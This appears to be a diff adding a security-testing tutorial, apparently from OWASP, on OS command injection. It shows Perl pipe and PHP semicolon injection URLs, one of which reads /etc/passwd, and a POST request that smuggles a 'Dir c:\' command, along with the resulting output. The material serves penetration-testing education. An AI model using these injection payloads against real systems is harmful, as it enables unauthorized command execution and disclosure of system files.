@@ -1,0 +1,88 @@
+When viewing a file in a web application, the filename is often shown in the URL. Perl allows piping data from a process into an open statement. The user can simply append the Pipe symbol `|` onto the end of the filename.
+
+Example URL before alteration:
+
+`http://sensitive/cgi-bin/userData.pl?doc=user1.txt`
+
+Example URL modified:
+
+`http://sensitive/cgi-bin/userData.pl?doc=/bin/ls|`
+
+This will execute the command `/bin/ls`.
+
+Appending a semicolon to the end of a URL for a .PHP page followed by an operating system command, will execute the command. `%3B` is URL encoded and decodes to semicolon
+
+Example:
+
+`http://sensitive/something.php?dir=%3Bcat%20/etc/passwd`
+
+# Example
+
+Consider the case of an application that contains a set of documents that you can browse from the Internet. If you fire up a personal proxy (such as ZAP or Burp Suite), you can obtain a POST HTTP like the following (`http://www.example.com/public/doc`):
+
+```txt
+POST /public/doc HTTP/1.1
+Host: www.example.com
+[...]
+Referer: http://127.0.0.1/WebGoat/attack?Screen=20
+Cookie: JSESSIONID=295500AD2AAEEBEDC9DB86E34F24A0A5
+Authorization: Basic T2Vbc1Q9Z3V2Tc3e=
+Content-Type: application/x-www-form-urlencoded
+Content-length: 33
+
+Doc=Doc1.pdf
+```
+
+In this post request, we notice how the application retrieves the public documentation. Now we can test if it is possible to add an operating system command to inject in the POST HTTP. Try the following (`http://www.example.com/public/doc`):
+
+```txt
+POST /public/doc HTTP/1.1
+Host: www.example.com
+[...]
+Referer: http://127.0.0.1/WebGoat/attack?Screen=20
+Cookie: JSESSIONID=295500AD2AAEEBEDC9DB86E34F24A0A5
+Authorization: Basic T2Vbc1Q9Z3V2Tc3e=
+Content-Type: application/x-www-form-urlencoded
+Content-length: 33
+
+Doc=Doc1.pdf+|+Dir c:\
+```
+
+If the application doesn't validate the request, we can obtain the following result:
+
+```txt
+    Exec Results for 'cmd.exe /c type "C:\httpd\public\doc\"Doc=Doc1.pdf+|+Dir c:\'
+    Output...
+    Il volume nell'unità C non ha etichetta.
+    Numero di serie Del volume: 8E3F-4B61
+    Directory of c:\
+     18/10/2006 00:27 2,675 Dir_Prog.txt
+     18/10/2006 00:28 3,887 Dir_ProgFile.txt
+     16/11/2006 10:43
+        Doc
+        11/11/2006 17:25
+           Documents and Settings
+           25/10/2006 03:11
+              I386
+              14/11/2006 18:51
+             h4ck3r
+             30/09/2005 21:40 25,934
+            OWASP1.JPG
+            03/11/2006 18:29
+                Prog
+                18/11/2006 11:20
+                    Program Files
+                    16/11/2006 21:12
+                        Software
+                        24/10/2006 18:25
+                            Setup
+                            24/10/2006 23:37
+                                Technologies
+                                18/11/2006 11:14
+                                3 File 32,496 byte
+                                13 Directory 6,921,269,248 byte disponibili
+                                Return code: 0
+```
+
+In this case, we have successfully performed an OS injection attack.
+
